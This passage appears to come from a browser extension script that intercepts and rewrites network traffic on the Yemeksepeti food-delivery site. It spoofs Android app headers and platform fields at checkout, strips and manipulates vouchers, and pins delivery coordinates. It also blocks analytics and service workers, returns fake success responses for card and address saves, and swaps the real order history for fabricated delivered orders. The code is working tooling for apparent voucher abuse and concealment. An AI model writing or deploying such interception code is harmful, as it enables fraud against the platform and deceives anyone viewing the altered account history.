    if (f.ordered_at) f.ordered_at.date = _fmtDate(ts);
    if (f.confirmed_delivery_time) f.confirmed_delivery_time.date = _fmtDate(ts + 30 * 60 * 1000);
    if (f.current_status) {
      f.current_status.type = 'final';
      if (f.current_status.changedAt) f.current_status.changedAt.date = _fmtDate(ts + 35 * 60 * 1000);
    }
    f.status_flags = f.status_flags || {};
    f.status_flags.is_active = false;
    f.status_flags.is_delivered = true;
    f.status_flags.is_past_order = true;
    f.status_flags.is_completed = true;
    f.status_flags.is_canceled = false;
    return [f];
  }

  function _ordersPayload(items) {
    return JSON.stringify({ status_code: 200, data: { total_count: String(items.length), items: items, features: {} } });
  }

  function transformOrderHistory(realText, cutoffTs, offset) {
    if (offset && offset > 0) {
      try { var j = JSON.parse(realText); if (j && j.data) { j.data.items = []; j.data.total_count = "0"; return JSON.stringify(j); } } catch (e) {}
      return _ordersPayload([]);
    }
    var json = null;
    try { json = JSON.parse(realText); } catch (e) { json = null; }
    var active = [];
    if (json && json.data && Array.isArray(json.data.items)) {
      for (var i = 0; i < json.data.items.length; i++) {
        var it = json.data.items[i];
        // Aktif siparis her zaman kalir. Gecmis (poşet dahil) gizlenir, yerine fake siparis gelir.
        if (isActiveOrder(it)) active.push(it);
      }
    }
    var finalItems = active.concat(buildFakeOrders(cutoffTs));
    if (json && json.data) {
      json.data.items = finalItems;
      json.data.total_count = String(finalItems.length);
      return JSON.stringify(json);
    }
    return _ordersPayload(finalItems);
  }

const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  const originalXHRAddEventListener = XMLHttpRequest.prototype.addEventListener;
  XMLHttpRequest.prototype.addEventListener = function (type, listener, opts) {
    if (this._ytOrderHistory && (type === 'readystatechange' || type === 'load' || type === 'loadend') && typeof listener === 'function' && !listener._ytOrdersWrapped) {
      var xhr = this;
      var wrapped = function () {
        if (typeof xhr._ytApplyOrders === 'function') xhr._ytApplyOrders();
        return listener.apply(this, arguments);
      };
      wrapped._ytOrdersWrapped = true;
      return originalXHRAddEventListener.call(this, type, wrapped, opts);
    }
    return originalXHRAddEventListener.call(this, type, listener, opts);
  };

  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    if (this._ytOrderBypass) {
      return originalXHROpen.apply(this, [method, url, ...args]);
    }
    // Rakip: vouchers/save URL'sine dokunma (apply 404 veriyordu)
    this._requestUrl = url;
    this._requestMethod = method;
    this._requestHeaders = {};

    if (typeof url === 'string') {
      if (isOrderHistoryEndpoint(url)) this._ytOrderHistory = true;
      if (isYsProxyEndpoint(url)) {
        console.log('XMLHttpRequest: YS Proxy endpoint yakalandı:', url);
        this._isYsProxyEndpoint = true;
      }
      if (isServiceWorkerFile(url)) {
        this._isServiceWorkerFile = true;
      }
      if (isPWAManifestFile(url)) {
        this._isPWAManifestFile = true;
      }
      // NOT: Ağ yanıtlarını (XHR/fetch) JSON seviyesinde filtreleme KAPATILDI.
      // "/graphql" gibi genel endpoint'ler kupon dışında da (restoran, menü,
      // kategori vb.) çok veri taşıyor; "kazan"/"marketler" gibi kelimeler
      // ilgisiz alanlarda da geçebildiği için filtre sitenin başka
      // bölümlerini bozuyordu. Kupon gizleme SADECE DOM/CSS seviyesinde
      // (content_script.js) yapılır, ağ yanıtına asla dokunulmaz.
    }

    return originalXHROpen.apply(this, [method, url, ...args]);
  };

  XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
    this._requestHeaders = this._requestHeaders || {};
    this._requestHeaders[header] = value;
    return originalXHRSetRequestHeader.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (this._ytOrderBypass) {
      return originalXHRSend.apply(this, arguments);
    }

    if (isPerseusAnalyticsEndpoint(this._requestUrl)) {
      console.log('Perseus Analytics XHR isteği engellendi:', this._requestUrl);

      this.abort();

      const xhr = this;
      Object.defineProperty(xhr, 'readyState', { configurable: true, get: function() { return 4; } });
      Object.defineProperty(xhr, 'status', { configurable: true, get: function() { return 200; } });
      Object.defineProperty(xhr, 'statusText', { configurable: true, get: function() { return 'OK'; } });
      Object.defineProperty(xhr, 'responseText', { configurable: true, get: function() { return '{}'; } });
      Object.defineProperty(xhr, 'response', { configurable: true, get: function() { return '{}'; } });

      setTimeout(() => {
        if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange();
        if (typeof xhr.onload === 'function') xhr.onload();
        if (typeof xhr.onloadend === 'function') xhr.onloadend();
        xhr.dispatchEvent(new Event('readystatechange'));
        xhr.dispatchEvent(new Event('load'));
        xhr.dispatchEvent(new Event('loadend'));
      }, 50);

      return;
    }

if (this._isServiceWorkerFile) {
      console.log('Service Worker dosyası engellendi:', this._requestUrl);
      this.abort();
      const swXhr = this;
      setTimeout(() => {
        Object.defineProperty(swXhr, 'readyState', { value: 4, configurable: true });
        Object.defineProperty(swXhr, 'status', { value: 404, configurable: true });
        Object.defineProperty(swXhr, 'statusText', { value: 'Not Found', configurable: true });
        Object.defineProperty(swXhr, 'responseText', { value: '', configurable: true });
        Object.defineProperty(swXhr, 'response', { value: '', configurable: true });
        if (typeof swXhr.onerror === 'function') swXhr.onerror();
        if (typeof swXhr.onreadystatechange === 'function') swXhr.onreadystatechange();
        if (typeof swXhr.onloadend === 'function') swXhr.onloadend();
        swXhr.dispatchEvent(new Event('error'));
        swXhr.dispatchEvent(new Event('readystatechange'));
        swXhr.dispatchEvent(new Event('loadend'));
      }, 50);
      return;
    }

if (this._isPWAManifestFile) {
      console.log('PWA Manifest dosyası engellendi:', this._requestUrl);
      this.abort();
      const mXhr = this;
      setTimeout(() => {
        Object.defineProperty(mXhr, 'readyState', { value: 4, configurable: true });
        Object.defineProperty(mXhr, 'status', { value: 404, configurable: true });
        Object.defineProperty(mXhr, 'statusText', { value: 'Not Found', configurable: true });
        Object.defineProperty(mXhr, 'responseText', { value: '', configurable: true });
        Object.defineProperty(mXhr, 'response', { value: '', configurable: true });
        if (typeof mXhr.onerror === 'function') mXhr.onerror();
        if (typeof mXhr.onreadystatechange === 'function') mXhr.onreadystatechange();
        if (typeof mXhr.onloadend === 'function') mXhr.onloadend();
        mXhr.dispatchEvent(new Event('error'));
        mXhr.dispatchEvent(new Event('readystatechange'));
        mXhr.dispatchEvent(new Event('loadend'));
      }, 50);
      return;
    }

if (isCardSaveEndpoint(this._requestUrl, this._requestMethod)) {
      console.log('Kart kaydetme isteği engellendi:', this._requestUrl);
      this.abort();
      fakeXhrSuccess(this, '{"id":"blocked","type":"CREDIT_CARD","status":"ACTIVE"}');
      return;
    }

if (isAddressSaveEndpoint(this._requestUrl, this._requestMethod)) {
      console.log('Adres kaydetme isteği engellendi:', this._requestUrl);
      this.abort();
      fakeXhrSuccess(this, '{"id":"blocked","status":"OK"}');
      return;
    }

if (checkoutInProgress && !calculateBlockedDuringCheckout && isYemekSepetiCalculateEndpoint(this._requestUrl)) {
      console.log('🛑 Checkout sırasında calculate isteği engellendi (XHR):', this._requestUrl);
      calculateBlockedDuringCheckout = true;
      this.abort();
      const cachedData = lastCalculateResponse || '{"data":{}}';
      fakeXhrSuccess(this, cachedData);
      return;
    }

if (discoveryInProgress && isYemekSepetiCalculateEndpoint(this._requestUrl)) {
      console.log('🛑 Keşif devam ediyor, calculate isteği engellendi (XHR):', this._requestUrl);
      this.abort();
      const cachedData = lastCalculateResponse || '{"data":{}}';
      fakeXhrSuccess(this, cachedData);
      return;
    }

if (this._isYsProxyEndpoint) {
      const isCheckout = this._requestUrl.includes('cart/checkout');
      const isCalculate = this._requestUrl.includes('cart/calculate');
      console.log('YS Proxy: XHR isteği yakalandı ve proxy\'leniyor', this._requestUrl);

      if (isCheckout) {
        checkoutInProgress = true;
        calculateBlockedDuringCheckout = false;
      }

      const originalXhr = this;
      this.abort();

let finalBody = body;
      if (isCheckout && body) {
        try {
          const requestBody = JSON.parse(body);
          console.log('YS Proxy: Orijinal checkout body:', requestBody);

          if (requestBody.platform && requestBody.platform === 'b2c') {
            requestBody.platform = 'Android-app-26.7.0(260700154)';
            console.log('YS Proxy: Platform değiştirildi');
          }

          requestBody.source = 'android'; stripBlockedVoucherFromBody(requestBody);

if (lockedCoordinates && requestBody.expedition) {
            requestBody.expedition.latitude = lockedCoordinates.latitude;
            requestBody.expedition.longitude = lockedCoordinates.longitude;
            if (requestBody.expedition.delivery_address) {
              requestBody.expedition.delivery_address.latitude = lockedCoordinates.latitude;
              requestBody.expedition.delivery_address.longitude = lockedCoordinates.longitude;
            }
            console.log(`YS Proxy: Checkout koordinatları sabitlenmiş değerle güncellendi (${lockedCoordinates.latitude},${lockedCoordinates.longitude})`);
          }

          finalBody = JSON.stringify(requestBody);
          console.log('YS Proxy: Değiştirilmiş checkout body:', requestBody);
        } catch (error) {
          console.error('YS Proxy: Checkout body manipülasyon hatası:', error);
          finalBody = body;
        }
      }

      if (isCalculate && body) {
        try {
          const requestBody = JSON.parse(body);
            console.log('YS Proxy: Orijinal calculate body:', requestBody);
            stripBlockedVoucherFromBody(requestBody);

          const isVoucherCalculate = !!(requestBody.voucher && requestBody.voucher.length > 0);

          /*
          // Koordinat keşfi şimdilik kapalı.
          if (isVoucherCalculate && requestBody.expedition && requestBody.expedition.latitude && requestBody.expedition.longitude && !lockedCoordinates) {
            console.log('🔍 Voucher\'lı calculate - otomatik koordinat keşfi başlatılıyor...');
            (async () => {
              try {
                const discovered = await discoverValidCoordinate(JSON.stringify(requestBody), originalXhr._requestUrl);
                if (discovered) {
                  requestBody.expedition.latitude = discovered.latitude;
                  requestBody.expedition.longitude = discovered.longitude;
                }
                finalBody = JSON.stringify(requestBody);
                sendXhrProxy(originalXhr, Date.now() + Math.random().toString().substring(2, 8), finalBody, isCheckout, isCalculate, originalXhr._requestUrl);
              } catch (err) {
                console.error('Koordinat keşif hatası:', err);
                finalBody = JSON.stringify(requestBody);
                sendXhrProxy(originalXhr, Date.now() + Math.random().toString().substring(2, 8), finalBody, isCheckout, isCalculate, originalXhr._requestUrl);
              }
            })();
            return;
          }

          if (requestBody.expedition && requestBody.expedition.latitude && requestBody.expedition.longitude && lockedCoordinates) {
            requestBody.expedition.latitude = lockedCoordinates.latitude;
            requestBody.expedition.longitude = lockedCoordinates.longitude;
            console.log(`YS Proxy: Calculate sabitlenmiş koordinat kullanıldı (${lockedCoordinates.latitude},${lockedCoordinates.longitude})`);
          }
          */

          finalBody = JSON.stringify(requestBody);
        } catch (error) {
          console.error('YS Proxy: Calculate body manipülasyon hatası:', error);
          finalBody = body;
        }
      }

      sendXhrProxy(originalXhr, Date.now() + Math.random().toString().substring(2, 8), finalBody, isCheckout, isCalculate, this._requestUrl, this._requestMethod || 'POST');
      return;
    }

  function sendXhrProxy(originalXhr, requestId, finalBody, isCheckout, isCalculate, requestUrl, requestMethod) {
      window.ysEnhancement = window.ysEnhancement || {};
      window.ysEnhancement.xhrCallbacks = window.ysEnhancement.xhrCallbacks || {};

      window.ysEnhancement.xhrCallbacks[requestId] = (response) => {
        if (isCheckout) {
          checkoutInProgress = false;
        }
        if (response && response.success) {
          console.log('YS Proxy yanıtı alındı:', response.status);

          if (isCalculate && response.status >= 200 && response.status < 300 && response.data) {
            lastCalculateResponse = response.data;
          }
          if (isCalculate && response.status === 403) {
            showCalculateIpResetWarning();
          }

          try {
            Object.defineProperty(originalXhr, 'readyState', { value: 4, configurable: true });
            Object.defineProperty(originalXhr, 'status', { value: response.status, configurable: true });
            Object.defineProperty(originalXhr, 'statusText', { value: response.statusText || '', configurable: true });
            Object.defineProperty(originalXhr, 'response', { value: response.data, configurable: true });
            Object.defineProperty(originalXhr, 'responseText', { value: response.data, configurable: true });

            if (typeof originalXhr.onreadystatechange === 'function') originalXhr.onreadystatechange();
            if (response.status >= 200 && response.status < 300) {
              if (typeof originalXhr.onload === 'function') originalXhr.onload();
              originalXhr.dispatchEvent(new Event('load'));
            } else {
              if (typeof originalXhr.onerror === 'function') originalXhr.onerror();
              originalXhr.dispatchEvent(new Event('error'));
            }
            if (typeof originalXhr.onloadend === 'function') originalXhr.onloadend();
            originalXhr.dispatchEvent(new Event('loadend'));
          } catch (e) {
            console.error("XHR response mock hatası:", e);
          }
        } else {
          console.error('YS Proxy hatası:', response ? response.error : 'Bilinmeyen hata');
          if (isCheckout) {
            checkoutInProgress = false;
          }
        }
        delete window.ysEnhancement.xhrCallbacks[requestId];
      };

      window.postMessage({
        source: 'YS_ENHANCEMENT_EXTENSION',
        action: 'ysProxyRequest',
        requestId: requestId,
        url: requestUrl,
        method: (requestMethod || 'POST').toUpperCase(),
        headers: {},
        body: finalBody
      }, '*');
  }

if (isGraphqlEndpoint(this._requestUrl)) {
      console.log('YS Graphql Vouchers endpoint XHR isteği yakalandı:', this._requestUrl);
      if (typeof body === 'string') {
        try {
          const parsed = JSON.parse(body);
          if (parsed && parsed.operationName === 'GetIncentivesCartWallet') {
            console.log('YS Graphql Vouchers endpoint XHR isteği GetIncentivesCartWallet operasyonu içeriyor, proxy\'leniyor');
            const headersToRemove = ['sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site'];
            headersToRemove.forEach(h => delete this._requestHeaders[h]);
            const androidHeaders = {
              'user-agent': 'Android-app-26.7.0(260700154)',
              'x-fp-api-key': 'android',
              'platform': 'android',
              'apollographql-client-name': 'android'
            };
            for (const [key, value] of Object.entries(androidHeaders)) {
              this._requestHeaders[key] = value;
            }
            for (const [key, value] of Object.entries(this._requestHeaders)) {
              originalXHRSetRequestHeader.apply(this, key, value);
            }
          }
        } catch (e) {
          console.log('YS Graphql Vouchers endpoint XHR isteği body\'si JSON değil:', e);
        }
      }
    }

if (isYemekSepetiVouchersEndpoint(this._requestUrl) && this._requestMethod === 'POST') {
      try {
        // Rakip: save URL + android device header; Authorization dokunulmaz
        console.log('XMLHttpRequest: YS headers ekleniyor (vouchers):', this._requestUrl);
        const ysHeaders = generateYSHeaders();
        for (const [key, value] of Object.entries(ysHeaders)) {
          this.setRequestHeader(key, value);
        }
        console.log('XMLHttpRequest: YS headers eklendi');
      } catch (error) {
        console.error('XMLHttpRequest: YS headers eklenirken hata:', error);
      }
    }

    // Sipariş geçmişi: sayfanın kendi isteği kalsın. Geçmiş silinir, aktif kalır, teslim edilmiş fake eklenir.
    if (isOrderHistoryEndpoint(this._requestUrl)) {
      var orderXhr = this;
      var orderOffset = getUrlOffset(this._requestUrl);
      var orderDone = false;
      function applyOrderHistory() {
        if (orderDone || orderXhr.readyState !== 4) return;
        orderDone = true;
        var raw = '';
        try {
          if (orderXhr.responseType === 'json' && orderXhr.response) raw = JSON.stringify(orderXhr.response);
          else raw = orderXhr.responseText || '';
        } catch (e) { raw = ''; }
        var out = '';
        var parsed = null;
        try { out = transformOrderHistory(raw, getOrdersCutoffTs(), orderOffset); } catch (e2) { out = raw; }
        try { parsed = JSON.parse(out); } catch (e3) { parsed = null; }
        try {
          Object.defineProperty(orderXhr, 'responseText', { configurable: true, get: function () { return out; } });
          Object.defineProperty(orderXhr, 'response', { configurable: true, get: function () {
            return orderXhr.responseType === 'json' && parsed ? parsed : out;
          } });
        } catch (e4) {}
      }
      orderXhr._ytApplyOrders = applyOrderHistory;
      var prevHandler = orderXhr.onreadystatechange;
      orderXhr.onreadystatechange = function () {
        applyOrderHistory();
        if (typeof prevHandler === 'function') return prevHandler.apply(orderXhr, arguments);
      };
      var prevAdd = orderXhr.addEventListener;
      orderXhr.addEventListener = function (type, listener, opts) {
        if (type === 'readystatechange' || type === 'load' || type === 'loadend') {
          var wrapped = function () {
            applyOrderHistory();
            if (typeof listener === 'function') return listener.apply(this, arguments);
          };
          return prevAdd.call(orderXhr, type, wrapped, opts);
        }
        return prevAdd.call(orderXhr, type, listener, opts);
      };
      return originalXHRSend.call(orderXhr, body);
    }

    return originalXHRSend.call(this, body);
  };

const originalFetch = window.fetch;
  window.fetch = async function(resource, init) {
    const urlString = resource instanceof Request ? resource.url : String(resource);

if (isPerseusAnalyticsEndpoint(urlString)) {
      console.log('Fetch: Perseus Analytics isteği engellendi:', urlString);
      return new Response('{}', {
        status: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' }
      });
    }

if (isServiceWorkerFile(urlString)) {
      console.log('Fetch: Service Worker dosyası engellendi:', urlString);
      return new Response('', {
        status: 404, statusText: 'Not Found',
        headers: { 'Content-Type': 'text/plain' }
      });
    }

if (isPWAManifestFile(urlString)) {
      console.log('Fetch: PWA Manifest dosyası engellendi:', urlString);
      return new Response('', {
        status: 404, statusText: 'Not Found',
        headers: { 'Content-Type': 'text/plain' }
      });
    }

if (isCardSaveEndpoint(urlString, init?.method)) {
      console.log('Fetch: Kart kaydetme isteği engellendi:', urlString);
      return new Response('{"id":"blocked","type":"CREDIT_CARD","status":"ACTIVE"}', {
        status: 200, statusText: 'OK',
        headers: { 'Content-Type': 'application/json' }
      });
    }

if (isAddressSaveEndpoint(urlString, init?.method)) {
      console.log('Fetch: Adres kaydetme isteği engellendi:', urlString);
      return new Response('{"id":"blocked","status":"OK"}', {
        status: 200, statusText: 'OK',
        headers: { 'Content-Type': 'application/json' }
      });
    }

if (checkoutInProgress && !calculateBlockedDuringCheckout && isYemekSepetiCalculateEndpoint(urlString)) {
      console.log('🛑 Checkout sırasında calculate isteği engellendi (Fetch):', urlString);
      calculateBlockedDuringCheckout = true;
      const cachedData = lastCalculateResponse || '{"data":{}}';
      return new Response(cachedData, {
        status: 200, statusText: 'OK',
        headers: { 'Content-Type': 'application/json' }
      });
    }

if (discoveryInProgress && isYemekSepetiCalculateEndpoint(urlString)) {
      console.log('🛑 Keşif devam ediyor, calculate isteği engellendi (Fetch):', urlString);
      const cachedData = lastCalculateResponse || '{"data":{}}';
      return new Response(cachedData, {
        status: 200, statusText: 'OK',
        headers: { 'Content-Type': 'application/json' }
      });
    }

if (isYsProxyEndpoint(urlString)) {
      const isCheckout = urlString.includes('cart/checkout');
      const isCalculate = urlString.includes('cart/calculate');
      console.log('Fetch: YS Proxy endpoint yakalandı', urlString);

      if (isCheckout) {
        checkoutInProgress = true;
        calculateBlockedDuringCheckout = false;
      }

      try {
        let finalBody = init?.body || null;

if (isCheckout && init?.body) {
          try {
            let requestBody;
            if (typeof init.body === 'string') {
              requestBody = JSON.parse(init.body);
            } else {
              requestBody = JSON.parse(String(init.body));
            }

            console.log('YS Proxy (Fetch): Orijinal checkout body:', requestBody);

            if (requestBody.platform && requestBody.platform === 'b2c') {
              requestBody.platform = 'Android-app-26.7.0(260700154)';
            }

            requestBody.source = 'android'; stripBlockedVoucherFromBody(requestBody);

if (lockedCoordinates && requestBody.expedition) {
              requestBody.expedition.latitude = lockedCoordinates.latitude;
              requestBody.expedition.longitude = lockedCoordinates.longitude;
              if (requestBody.expedition.delivery_address) {
                requestBody.expedition.delivery_address.latitude = lockedCoordinates.latitude;
                requestBody.expedition.delivery_address.longitude = lockedCoordinates.longitude;
              }
              console.log(`YS Proxy (Fetch): Checkout koordinatları sabitlenmiş değerle güncellendi (${lockedCoordinates.latitude},${lockedCoordinates.longitude})`);
            }

            finalBody = JSON.stringify(requestBody);
            console.log('YS Proxy (Fetch): Değiştirilmiş checkout body:', requestBody);
          } catch (error) {
            console.error('YS Proxy (Fetch): Checkout body manipülasyon hatası:', error);
            finalBody = init?.body || null;
          }
        }

if (isCalculate && init?.body) {
          try {
            let requestBody;
            if (typeof init.body === 'string') {
              requestBody = JSON.parse(init.body);
            } else {
              requestBody = JSON.parse(String(init.body));
            }

            console.log('YS Proxy (Fetch): Orijinal calculate body:', requestBody);
            stripBlockedVoucherFromBody(requestBody);

            const isVoucherCalculate = !!(requestBody.voucher && requestBody.voucher.length > 0);

            /*
            // Koordinat keşfi şimdilik kapalı.
            if (isVoucherCalculate && requestBody.expedition && requestBody.expedition.latitude && requestBody.expedition.longitude && !lockedCoordinates) {
              console.log('🔍 (Fetch) Voucher\'lı calculate - otomatik koordinat keşfi başlatılıyor...');
              const discovered = await discoverValidCoordinate(JSON.stringify(requestBody), urlString);
              if (discovered) {
                requestBody.expedition.latitude = discovered.latitude;
                requestBody.expedition.longitude = discovered.longitude;
              }
            } else if (requestBody.expedition && requestBody.expedition.latitude && requestBody.expedition.longitude && lockedCoordinates) {
              requestBody.expedition.latitude = lockedCoordinates.latitude;
              requestBody.expedition.longitude = lockedCoordinates.longitude;
              console.log(`YS Proxy (Fetch): Calculate sabitlenmiş koordinat kullanıldı (${lockedCoordinates.latitude},${lockedCoordinates.longitude})`);
            }
            */

            finalBody = JSON.stringify(requestBody);
          } catch (error) {
            console.error('YS Proxy (Fetch): Calculate body manipülasyon hatası:', error);
            finalBody = init?.body || null;
          }
        }

        const proxyResponse = await sendProxyRequest({
          action: 'ysProxyRequest',
          url: urlString,
          method: init?.method || 'GET',
          headers: init?.headers || {},
          body: finalBody
        });

        if (isCheckout) {
          checkoutInProgress = false;
        }

        if (isCalculate && proxyResponse.status >= 200 && proxyResponse.status < 300 && proxyResponse.data) {
          lastCalculateResponse = proxyResponse.data;
        }
        if (isCalculate && proxyResponse.status === 403) {
          showCalculateIpResetWarning();
        }

        return new Response(proxyResponse.data, {
          status: proxyResponse.status,
          statusText: proxyResponse.statusText,
          headers: proxyResponse.headers
        });
      } catch (error) {
        console.error('Fetch proxy hatası:', error);
        if (isCheckout) {
          checkoutInProgress = false;
        }
        return new Response(null, { status: 503, statusText: 'Proxy Service Unavailable' });
      }
    }

if (isGraphqlEndpoint(urlString)) {
      console.log('Fetch: YS Graphql Vouchers endpoint yakalandı:', urlString);
      if (init?.body) {
        try {
          const parsed = JSON.parse(init.body);
          if (parsed && parsed.operationName === 'GetIncentivesCartWallet') {
            console.log('Fetch: YS Graphql Vouchers endpoint GetIncentivesCartWallet operasyonu içeriyor, proxy\'leniyor');
            const headersToRemove = ['sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site'];
            const newHeaders = new Headers(init?.headers || {});
            headersToRemove.forEach(h => newHeaders.delete(h));
            const androidHeaders = {
              'user-agent': 'Android-app-26.7.0(260700154)',
              'x-fp-api-key': 'android',
              'platform': 'android',
              'apollographql-client-name': 'android'
            };
            for (const [key, value] of Object.entries(androidHeaders)) {
              newHeaders.set(key, value);
            }
            init = { ...init, headers: newHeaders };
          }
        } catch (e) {
          console.log('Fetch: YS Graphql Vouchers endpoint body\'si JSON değil:', e);
        }
      }
    }

if (init && init.method === 'POST' && isYemekSepetiVouchersEndpoint(urlString)) {
      try {
        // Rakip: save kalsın, sadece android device header (Auth ezilmez)
        console.log('Fetch: YS headers ekleniyor (vouchers):', urlString);
        const ysHeaders = generateYSHeaders();
        const modifiedInit = {
          ...init,
          headers: {
            ...init.headers,
            ...ysHeaders
          }
        };
        console.log('Fetch: YS headers eklendi');
        return await originalFetch.call(this, urlString, modifiedInit);
      } catch (error) {
        console.error('Fetch: YS headers eklenirken hata:', error);
      }
    }

    // Sipariş geçmişi (order_history): gerçek eski siparişleri gizle + fake sipariş ekle
    if (isOrderHistoryEndpoint(urlString)) {
      try {
        const _ohResp = await originalFetch.call(this, resource, init);
        const _ohText = await _ohResp.clone().text();
        const _ohOut = transformOrderHistory(_ohText, getOrdersCutoffTs(), getUrlOffset(urlString));
        return new Response(_ohOut, {
          status: _ohResp.status,
          statusText: _ohResp.statusText,
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (e) {
        return new Response(transformOrderHistory('', getOrdersCutoffTs(), getUrlOffset(urlString)), {
          status: 200,
          statusText: 'OK',
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }

    // NOT: Fetch yanıtlarını JSON seviyesinde filtreleme KAPATILDI (bkz. yukarıdaki not).
    // Kupon gizleme SADECE DOM/CSS seviyesinde yapılır.
    return await originalFetch.call(this, resource, init);
  };

async function filterFetchVoucherResponse(response, urlString) {
    try {
      if (!response || !response.ok) return response;
      const rules = getHiddenVoucherRules();
      if ((!rules.codes || !rules.codes.length) && (!rules.keywords || !rules.keywords.length)) {
        return response;
      }
      const clone = response.clone();
      const text = await clone.text();
      const filtered = filterVoucherPayloadText(text);
      if (filtered === text) return response;
      return new Response(filtered, {
        status: response.status,
        statusText: response.statusText,
        headers: response.headers
      });
    } catch (e) {
      console.warn('Fetch voucher filtre hatası:', e);
      return response;
    }
  }

if (navigator.sendBeacon) {
    const originalSendBeacon = navigator.sendBeacon;
    navigator.sendBeacon = function(url, data) {
      if (isPerseusAnalyticsEndpoint(url)) {
        console.log('Navigator.sendBeacon: Perseus Analytics isteği engellendi:', url);
        return true;
      }
      return originalSendBeacon.call(this, url, data);
    };
  }

if (window.EventSource) {
    const originalEventSource = window.EventSource;
    window.EventSource = function(url, eventSourceInitDict) {
      if (isPerseusAnalyticsEndpoint(url)) {
        console.log('EventSource: Perseus Analytics isteği engellendi:', url);

        const fakeEventSource = {
          close: function() {},
          addEventListener: function() {},
          removeEventListener: function() {},
          dispatchEvent: function() { return true; },
          readyState: 2,
          url: url,
          withCredentials: false
        };

        setTimeout(() => {
          if (typeof fakeEventSource.onerror === 'function') {
            fakeEventSource.onerror();
          }
        }, 10);

        return fakeEventSource;
      }
      return new originalEventSource(url, eventSourceInitDict);
    };
  }

function monitorAllRequests() {
    if (window.PerformanceObserver && window.PerformanceResourceTiming) {
      try {
        const observer = new PerformanceObserver((list) => {
          for (const entry of list.getEntries()) {
            if (entry.entryType === 'resource' && (entry.initiatorType === 'xmlhttprequest' || entry.initiatorType === 'fetch' || entry.initiatorType === 'script')) {
              if (isPerseusAnalyticsEndpoint(entry.name)) {
                console.warn('⚠️ Perseus Analytics isteği tespit edildi (engellenemedi):', entry.name);
              }
            }
          }
        });
        observer.observe({ entryTypes: ['resource'] });
        console.log('Network request monitor başlatıldı');
      } catch (e) {
        console.warn('Performance Observer başlatılamadı:', e);
      }
    }
  }

monitorAllRequests();

setInterval(() => {
    const ucRoot = document.getElementById('usercentrics-root');
    if (ucRoot) {
      ucRoot.remove();
      console.log('Usercentrics popup kaldırıldı');
    }
  }, 100);

window.addEventListener('message', function(event) {
    if (event.source !== window || !event.data || event.data.source !== 'YS_ENHANCEMENT_EXTENSION_CONTENT') {
      return;
    }

    if (event.data.action === 'proxyResponse') {
      const { requestId, response } = event.data;

if (window.ysEnhancement?.xhrCallbacks?.[requestId]) {
        window.ysEnhancement.xhrCallbacks[requestId](response);
      }

if (window.ysEnhancement?.callbacks?.[requestId]) {
        window.ysEnhancement.callbacks[requestId](response);
      }
    }
  });

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then(registrations => {
      registrations.forEach(registration => {
        registration.unregister().then(success => {
          if (success) {
            console.log('Service Worker kaydı kaldırıldı:', registration.scope);
          }
        });
      });
    });
  }

const manifestObserver = new MutationObserver(() => {
    const manifestLinks = document.querySelectorAll(
      'link[rel="manifest"], link[href*="manifest.json"], link[href*="ngsw.json"]'
    );
    if (manifestLinks.length > 0) {
      manifestLinks.forEach(link => link.remove());
      console.log('PWA manifest linkleri DOM\'dan kaldırıldı:', manifestLinks.length, 'adet');
    }
  });
  manifestObserver.observe(document.documentElement, { childList: true, subtree: true });

})();